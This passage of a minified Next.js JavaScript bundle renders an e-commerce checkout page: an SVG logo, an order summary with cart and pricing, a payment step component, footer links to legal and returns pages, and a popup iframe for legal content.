3.07Zm-13.14-10.17-.35.01c-1.5.05-3.4.77-4.22 1.28l-.28-1h-4.08v13.5h4.94v-8.7a4.8 4.8 0 0 1 2.47-.72c.63 0 .94.5.94 1.33v8.1h5V14.7c0-2.96-1.33-4.65-4.42-4.65Zm-22.57.68v3.8c.44-.13 2.44-.7 4.93-.7 1.76-.02 2.6.5 2.6 1.88h-2.37c-3.38 0-6.39.82-6.39 4.23 0 2.1 1.65 4.25 4.77 4.25 2.85 0 4.19-1 4.19-1l.28.65h3.78v-8.2c0-7.05-7.3-5.73-11.15-5.03l-.64.12Zm7.56 7.99c0 1.55-.99 2.25-2.85 2.25-1.24 0-1.97-.36-1.97-1.26s.83-1.16 2.57-1.16l2.25.02v.15Z",fill:"#fff"}),(0,r.jsx)("defs",{children:(0,r.jsxs)("linearGradient",{id:"tama-b2c-multicolor-light-horizontal-header-logo-b",x1:"5.36",y1:"23.31",x2:"22.51",y2:"9.08",gradientUnits:"userSpaceOnUse",children:[(0,r.jsx)("stop",{"stop-color":"#0397A7"}),(0,r.jsx)("stop",{offset:"1","stop-color":"#00ECCD"})]})})]})}),(0,r.jsx)(d,{cart:o,totalPrice:M,discount:O,discountedPrice:V,name:a.name,paymentFees:A,data:t,shop:a})]}),(0,r.jsxs)("div",{className:"right-column",children:[(0,r.jsx)(j,{currentStep:w,showStep:e=>{E(e)},selectedPaymentMethod:u,setSelectedPaymentMethod:h,totalPrice:M,discountedPrice:V,cart:o,shop:a,orderNumber:I,onBack:()=>{E(e=>Math.max(e-1,0))},data:t}),(0,r.jsxs)("div",{className:"legals-link",children:[(0,r.jsx)("a",{onClick:()=>B("/legals"),children:t.legalsPageLabel}),(0,r.jsx)("a",{onClick:()=>B("/cgv"),children:t.cgvPageLabel}),(0,r.jsx)("a",{onClick:()=>B("/confidentiality"),children:t.confidentialityPageLabel}),(0,r.jsx)("br",{}),(0,r.jsx)("a",{onClick:()=>B("/returns"),children:t.returnsPageLabel}),(0,r.jsx)("a",{onClick:()=>B("/follow-order"),children:t.followPageLabel})]}),D&&(0,r.jsxs)("div",{className:"popup-overlay",onClick:z,children:[(0,r.jsx)("button",{className:"close-popup",onClick:z,children:"X"}),(0,r.jsx)("div",{className:"popup-content",onClick:e=>e.stopPropagation(),children:(0,r.jsx)("iframe",{src:q,className:"popup-iframe",title:"Legal Content"})})]})]})]})}}},e=>{var t=t=>e(e.s=t);e.O(0,[125,636,593,792],()=>t(2508)),_N_E=e.O()}]);